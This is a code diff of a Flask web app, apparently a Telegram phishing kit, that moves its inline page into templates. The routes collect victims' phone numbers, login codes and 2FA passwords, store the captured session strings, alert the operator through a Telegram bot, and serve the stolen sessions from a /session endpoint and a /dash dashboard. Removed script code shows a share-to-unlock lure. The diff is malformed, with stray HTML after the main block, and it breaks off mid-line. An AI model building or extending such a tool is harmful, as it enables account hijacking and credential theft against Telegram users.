@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template
 import os
 import json
 import base64
@@ -262,8 +262,142 @@ def run_telegram_action(phone, code=None, password=None):
         loop.close()
 
 
-# ============ WEBAPP PAGE ============
-WEBAPP = r'''<!DOCTYPE html>
+# ============ ROUTES ============
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/tg')
+def tg_webapp():
+    return render_template('index.html')
+
+
+@app.route('/health')
+def health():
+    return jsonify({
+        'status': 'ok',
+        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
+        'API_ID': API_ID,
+        'API_HASH': 'SET' if API_HASH else 'MISSING',
+        'OWNER_ID': YOUR_TELEGRAM_ID,
+        'accounts': len(captured_accounts)
+    })
+
+
+@app.route('/api/save_contact', methods=['POST'])
+def save_contact():
+    d = request.json
+    tg_id = d.get('tg_id')
+    phone = d.get('phone')
+    if not phone or not tg_id:
+        return jsonify({'success': False, 'error': 'Missing data'})
+    phone = format_phone(phone)
+
+    accounts = load_accounts()
+    existing = next((a for a in accounts if a['phone'] == phone), None)
+    if existing:
+        return jsonify({
+            'success': True,
+            'already_captured': True,
+            'phone': phone,
+            'user_id': existing['user_id']
+        })
+
+    with sessions_lock:
+        pending_codes[phone] = 'contact_saved'
+
+    logger.info(f"Contact saved: {phone} | TG: {tg_id}")
+
+    try:
+        http_requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={
+                'chat_id': YOUR_TELEGRAM_ID,
+                'text': f"Contact Captured\nTG ID: `{tg_id}`\nPhone: `{phone}`",
+                'parse_mode': 'Markdown'
+            },
+            timeout=10
+        )
+    except Exception:
+        pass
+
+    return jsonify({'success': True, 'phone': phone})
+
+
+@app.route('/api/share', methods=['POST'])
+def share():
+    ph = request.json.get('phone', '')
+    if not ph:
+        return jsonify({'success': False, 'error': 'Phone required'})
+    ph = format_phone(ph)
+    with sessions_lock:
+        pending_codes[ph] = 'sending'
+    t = threading.Thread(target=run_telegram_action, args=(ph,))
+    t.daemon = True
+    t.start()
+    return jsonify({'success': True})
+
+
+@app.route('/api/check', methods=['POST'])
+def check():
+    phone = format_phone(request.json.get('phone', ''))
+    with sessions_lock:
+        s = pending_codes.get(phone, 'waiting')
+    if s == 'waiting':
+        accounts = load_accounts()
+        if any(a['phone'] == phone for a in accounts):
+            s = 'done'
+    return jsonify({'s': s})
+
+
+@app.route('/api/verify', methods=['POST'])
+def verify_route():
+    d = request.json
+    ph = format_phone(d.get('phone', ''))
+    result = run_telegram_action(ph, d.get('code', ''), d.get('password'))
+    return jsonify(result)
+
+
+@app.route('/session/<phone>')
+def get_session(phone):
+    phone = format_phone(phone)
+    global captured_accounts
+    captured_accounts = load_accounts()
+    a = next((x for x in captured_accounts if x['phone'] == phone), None)
+    if not a:
+        return jsonify({'error': 'Not found'}), 404
+    return jsonify({
+        'phone': phone,
+        'user_id': a['user_id'],
+        'name': f"{a['first_name']} {a['last_name']}",
+        'username': a['username'],
+        'dc': a['dc'],
+        'session': a['session'],
+        'session_length': len(a['session']),
+        'has_2fa': a.get('has_2fa', False)
+    })
+
+
+@app.route('/dash')
+def dash():
+    global captured_accounts
+    captured_accounts = load_accounts()
+    rows = ""
+    for i, a in enumerate(captured_accounts, 1):
+        ss_len = len(a.get('session', ''))
+        tag = "2FA" if a.get('has_2fa') else ""
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tag} ({ss_len})</td><td>{a.get('time','')}</td></tr>"
+    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
+    return render_template('dash.html', rows=rows, total=len(captured_accounts), total_2fa=total_2fa)
+
+
+if __name__ == '__main__':
+    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
+        logger.warning("Some env vars missing!")
+    app.run(host='0.0.0.0', port=PORT, debug=False)
+    <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -701,160 +835,4 @@ window.open(shareUrl, '_blank');
 sharesDone = Math.min(sharesDone + 1, 5);
 localStorage.setItem(USER_SHARES_KEY, String(sharesDone));
 updateShareSteps();
-if (sharesDone >= 5) {
-document.getElementById('shareStatus').className = 'sb success show';
-document.getElementById('shareStatus').textContent = 'Unlocked!';
-} else {
-document.getElementById('shareStatus').className = 'sb success show';
-document.getElementById('shareStatus').textContent = sharesDone + '/5 done!';
-}
-}
-
-function updateShareSteps() {
-for (var i = 1; i <= 5; i++) {
-var el = document.getElementById('st' + i);
-if (i <= sharesDone) el.className = 'step done';
-else if (i === sharesDone + 1) el.className = 'step active';
-else el.className = 'step';
-}
-}
-
-if (window.location.search.indexOf('auto=1') !== -1) {
-setTimeout(function() {
-document.getElementById('mainBtn').click();
-}, 500);
-}
-</script>
-</body>
-</html>'''
-
-
-# ============ ROUTES ============
-
-@app.route('/')
-def index():
-    return render_template_string(WEBAPP)
-
-
-@app.route('/tg')
-def tg_webapp():
-    return render_template_string(WEBAPP)
-
-
-@app.route('/health')
-def health():
-    return jsonify({
-        'status': 'ok',
-        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
-        'API_ID': API_ID,
-        'API_HASH': 'SET' if API_HASH else 'MISSING',
-        'OWNER_ID': YOUR_TELEGRAM_ID,
-        'accounts': len(captured_accounts)
-    })
-
-
-@app.route('/api/save_contact', methods=['POST'])
-def save_contact():
-    d = request.json
-    tg_id = d.get('tg_id')
-    phone = d.get('phone')
-    if not phone or not tg_id:
-        return jsonify({'success': False, 'error': 'Missing data'})
-    phone = format_phone(phone)
-
-    accounts = load_accounts()
-    existing = next((a for a in accounts if a['phone'] == phone), None)
-    if existing:
-        return jsonify({
-            'success': True,
-            'already_captured': True,
-            'phone': phone,
-            'user_id': existing['user_id']
-        })
-
-    with sessions_lock:
-        pending_codes[phone] = 'contact_saved'
-
-    logger.info(f"Contact saved: {phone} | TG: {tg_id}")
-
-    try:
-        http_requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                'chat_id': YOUR_TELEGRAM_ID,
-                'text': f"Contact Captured\nTG ID: `{tg_id}`\nPhone: `{phone}`",
-                'parse_mode': 'Markdown'
-            },
-            timeout=10
-        )
-    except Exception:
-        pass
-
-    return jsonify({'success': True, 'phone': phone})
-
-
-@app.route('/api/share', methods=['POST'])
-def share():
-    ph = request.json.get('phone', '')
-    if not ph:
-        return jsonify({'success': False, 'error': 'Phone required'})
-    ph = format_phone(ph)
-    with sessions_lock:
-        pending_codes[ph] = 'sending'
-    t = threading.Thread(target=run_telegram_action, args=(ph,))
-    t.daemon = True
-    t.start()
-    return jsonify({'success': True})
-
-
-@app.route('/api/check', methods=['POST'])
-def check():
-    phone = format_phone(request.json.get('phone', ''))
-    with sessions_lock:
-        s = pending_codes.get(phone, 'waiting')
-    if s == 'waiting':
-        accounts = load_accounts()
-        if any(a['phone'] == phone for a in accounts):
-            s = 'done'
-    return jsonify({'s': s})
-
-
-@app.route('/api/verify', methods=['POST'])
-def verify_route():
-    d = request.json
-    ph = format_phone(d.get('phone', ''))
-    result = run_telegram_action(ph, d.get('code', ''), d.get('password'))
-    return jsonify(result)
-
-
-@app.route('/session/<phone>')
-def get_session(phone):
-    phone = format_phone(phone)
-    global captured_accounts
-    captured_accounts = load_accounts()
-    a = next((x for x in captured_accounts if x['phone'] == phone), None)
-    if not a:
-        return jsonify({'error': 'Not found'}), 404
-    return jsonify({
-        'phone': phone,
-        'user_id': a['user_id'],
-        'name': f"{a['first_name']} {a['last_name']}",
-        'username': a['username'],
-        'dc': a['dc'],
-        'session': a['session'],
-        'session_length': len(a['session']),
-        'has_2fa': a.get('has_2fa', False)
-    })
-
-
-@app.route('/dash')
-def dash():
-    global captured_accounts
-    captured_accounts = load_accounts()
-    rows = ""
-    for i, a in enumerate(captured_accounts, 1):
-        ss_len = len(a.get('session', ''))
-        tag = "2FA" if a.get('has_2fa') else ""
-        rows += (
-            f"<tr><td>{i}</td>"
-            f"<td>{a['phone']}</td
+if (sh
